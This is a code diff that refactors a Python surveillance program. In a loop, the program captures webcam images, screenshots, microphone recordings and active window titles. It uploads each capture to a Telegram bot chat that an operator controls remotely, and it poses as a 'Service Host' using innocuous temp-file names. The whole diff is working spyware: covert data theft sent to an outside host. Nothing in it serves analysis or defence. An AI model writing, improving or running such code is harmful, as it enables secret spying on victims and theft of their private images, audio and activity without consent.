@@ -52,26 +52,28 @@ def update_remote_config():
             for update in resp.get("result", []):
                 LAST_UPDATE_ID = update["update_id"]
                 msg = update.get("message", {})
-                text = msg.get("text", "").strip()
+                text = msg.get("text", "").strip().lower()
                 
                 if str(msg.get("chat", {}).get("id")) == str(CHAT_ID):
-                    cmd_text = text.replace("/set ", "").strip()
-                    if cmd_text.isdigit():
-                        new_val = int(cmd_text)
-                        if 10 <= new_val <= 3600:
-                            INTERVAL = new_val
-                            # Send confirmation back to Telegram
-                            send_text_message(f"✅ Service interval updated to {INTERVAL} seconds.")
+                    if text.startswith("/set"):
+                        # Extract numbers from the message
+                        import re
+                        numbers = re.findall(r'\d+', text)
+                        if numbers:
+                            new_val = int(numbers[0])
+                            if 10 <= new_val <= 3600:
+                                INTERVAL = new_val
+                                send_text_message(f"✅ Interval updated to {INTERVAL}s")
+                        else:
+                            send_text_message("❌ Please provide a number (e.g., /set 60)")
     except Exception:
         pass
 
 def send_text_message(text):
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
     payload = {"chat_id": CHAT_ID, "text": text}
-    # If TOPIC_GENERAL is 1, it's usually the main chat (no ID needed)
     if TOPIC_GENERAL and str(TOPIC_GENERAL) != "1":
         payload["message_thread_id"] = TOPIC_GENERAL
-    
     try:
         requests.post(url, data=payload)
     except Exception:
@@ -79,8 +81,7 @@ def send_text_message(text):
 
 def capture_webcam(filename):
     cam = cv2.VideoCapture(0)
-    if not cam.isOpened():
-        return False
+    if not cam.isOpened(): return False
     time.sleep(0.5)
     ret, frame = cam.read()
     if ret:
@@ -94,8 +95,7 @@ def capture_screenshot(filename):
         screenshot = ImageGrab.grab()
         screenshot.save(filename, format='JPEG')
         return True
-    except Exception:
-        return False
+    except: return False
 
 def capture_audio(filename):
     try:
@@ -103,66 +103,62 @@ def capture_audio(filename):
         sd.wait()
         wavfile.write(filename, SAMPLE_RATE, recording)
         return True
-    except Exception:
-        return False
+    except: return False
 
 def send_to_telegram(window_title, webcam_file, screen_file, audio_file):
     url_photo = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
     url_doc = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+    cap = f"Context: {window_title}"
     
-    caption = f"Context: {window_title}"
-    
-    def post_data(url, topic_id, extra_data, files):
-        payload = {"chat_id": CHAT_ID, "caption": extra_data}
-        # Only add thread ID if it's not the 'General' fallback
-        if topic_id and str(topic_id) != "1":
-            payload["message_thread_id"] = topic_id
-            
-        try:
-            requests.post(url, data=payload, files=files)
-        except Exception:
-            pass
+    def post(u, tid, extra, fls):
+        p = {"chat_id": CHAT_ID, "caption": extra}
+        if tid and str(tid) != "1": p["message_thread_id"] = tid
+        try: requests.post(u, data=p, files=fls)
+        except: pass
 
     if os.path.exists(screen_file):
-        with open(screen_file, "rb") as f:
-            post_data(url_photo, TOPIC_SCREENSHOT, f"LOG_S\n{caption}", {"photo": f})
-            
+        with open(screen_file, "rb") as f: post(url_photo, TOPIC_SCREENSHOT, f"LOG_S\n{cap}", {"photo": f})
     if os.path.exists(webcam_file):
-        with open(webcam_file, "rb") as f:
-            post_data(url_photo, TOPIC_WEBCAM, f"LOG_W\n{caption}", {"photo": f})
-
+        with open(webcam_file, "rb") as f: post(url_photo, TOPIC_WEBCAM, f"LOG_W\n{cap}", {"photo": f})
     if os.path.exists(audio_file):
-        with open(audio_file, "rb") as f:
-            post_data(url_doc, TOPIC_AUDIO, f"LOG_A\n{caption}", {"document": f})
+        with open(audio_file, "rb") as f: post(url_doc, TOPIC_AUDIO, f"LOG_A\n{cap}", {"document": f})
 
 def main():
-    if not TOKEN or not CHAT_ID:
-        return
+    global LAST_UPDATE_ID
+    if not TOKEN or not CHAT_ID: return
 
-    webcam_file = get_temp_path("idx_01.tmp")
-    screen_file = get_temp_path("idx_02.tmp")
-    audio_file = get_temp_path("idx_03.tmp")
+    # Clear update queue on start
+    try:
+        r = requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates").json()
+        if r.get("ok") and r.get("result"):
+            LAST_UPDATE_ID = r["result"][-1]["update_id"]
+    except: pass
 
-    # Heartbeat: Notify that service has started
-    send_text_message(f"🚀 Service Host Initialized. Current Interval: {INTERVAL}s")
+    send_text_message(f"🚀 Service Host Online. Interval: {INTERVAL}s")
+
+    w_f = get_temp_path("idx_01.tmp")
+    s_f = get_temp_path("idx_02.tmp")
+    a_f = get_temp_path("idx_03.tmp")
 
     try:
         while True:
-            update_remote_config()
-            window_title = get_active_window()
+            # Capture and Send
+            ctx = get_active_window()
+            capture_webcam(w_f)
+            capture_screenshot(s_f)
+            capture_audio(a_f)
+            send_to_telegram(ctx, w_f, s_f, a_f)
             
-            capture_webcam(webcam_file)
-            capture_screenshot(screen_file)
-            capture_audio(audio_file)
-            
-            send_to_telegram(window_title, webcam_file, screen_file, audio_file)
-            
-            for f in [webcam_file, screen_file, audio_file]:
+            for f in [w_f, s_f, a_f]:
                 if os.path.exists(f):
                     try: os.remove(f)
                     except: pass
-            
-            time.sleep(INTERVAL)
+
+            # High-frequency command check during wait
+            start_wait = time.time()
+            while time.time() - start_wait < INTERVAL:
+                update_remote_config()
+                time.sleep(1)
             
     except KeyboardInterrupt:
         pass
